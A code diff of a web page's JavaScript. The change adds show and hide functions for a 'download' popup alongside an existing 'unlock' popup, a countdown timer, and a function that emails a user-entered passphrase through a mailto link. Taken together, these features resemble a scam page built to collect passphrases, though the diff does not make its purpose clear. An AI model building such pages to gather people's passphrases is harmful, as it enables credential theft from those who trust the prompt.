@@ -25,14 +25,24 @@ function updateTimer() {
   }, 1000);
 }
 
-// Show popup function
+// Show unlock popup
 function showPopup() {
   document.getElementById("unlockPopup").style.display = "block";
 }
 
-// Hide popup function
+// Hide unlock popup
 function hidePopup() {
   document.getElementById("unlockPopup").style.display = "none";
+}
+
+// Show download popup
+function showDownloadPopup() {
+  document.getElementById("downloadPopup").style.display = "block";
+}
+
+// Hide download popup
+function hideDownloadPopup() {
+  document.getElementById("downloadPopup").style.display = "none";
 }
 
 // Send passphrase via email (mailto method)
@@ -47,10 +57,10 @@ function sendPassphrase() {
   const subject = "Passphrase Submission";
   const body = `Passphrase: ${passphrase}`;
   const mailtoLink = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
-  
+
   window.location.href = mailtoLink;
 }
 
-// Start timer and show popup on page load
+// Initialize on page load
 updateTimer();
 showPopup();
